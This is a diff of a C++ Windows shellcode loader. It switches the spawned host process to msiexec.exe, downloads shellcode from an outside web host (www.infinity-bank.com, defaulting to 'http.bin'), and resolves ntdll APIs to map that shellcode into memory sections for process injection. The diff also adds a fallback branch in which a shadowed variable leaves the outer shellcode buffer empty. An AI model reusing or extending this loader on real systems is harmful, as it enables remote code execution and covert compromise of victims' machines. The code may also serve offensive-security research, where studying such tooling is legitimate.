@@ -10,7 +10,7 @@
 
 std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename);
 
-int main(int argc, char *argv[])
+int main(int argc, char* argv[])
 {
     // create startup info struct
     LPSTARTUPINFOW startup_info = new STARTUPINFOW();
@@ -21,8 +21,8 @@ int main(int argc, char *argv[])
     PPROCESS_INFORMATION process_info = new PROCESS_INFORMATION();
 
     // null terminated command line
-    wchar_t cmd[] = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\0";
-
+   // wchar_t cmd[] = L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\0";
+    wchar_t cmd[] = L"C:\\Windows\\System32\\msiexec.exe\0";
     // create process
     BOOL success = CreateProcess(
         NULL,
@@ -37,9 +37,16 @@ int main(int argc, char *argv[])
         process_info);
 
     // download shellcode
-    std::string p = argv[1];
-    std::wstring ptemp = std::wstring(p.begin(), p.end());
-    std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", ptemp.c_str());
+    std::vector<BYTE> shellcode;
+    if (argc != 2) {
+        std::vector<BYTE> shellcode = Download(L"www.infinity-bank.com\0", L"http.bin\0");
+    }
+    else {
+        std::string p = argv[1];
+        std::wstring ptemp = std::wstring(p.begin(), p.end());
+        shellcode = Download(L"www.infinity-bank.com\0", ptemp.c_str());
+    }
+
 
     // find Nt APIs
     HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
@@ -49,7 +56,7 @@ int main(int argc, char *argv[])
 
     // create section in local process
     HANDLE hSection;
-    LARGE_INTEGER szSection = {shellcode.size()};
+    LARGE_INTEGER szSection = { shellcode.size() };
 
     NTSTATUS status = ntCreateSection(
         &hSection,
@@ -178,8 +185,10 @@ std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
     WinHttpCloseHandle(hSession);
 
     return buffer;
-}
+}   
 
+
+// SSL
 // std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {
 
 //     // initialise session
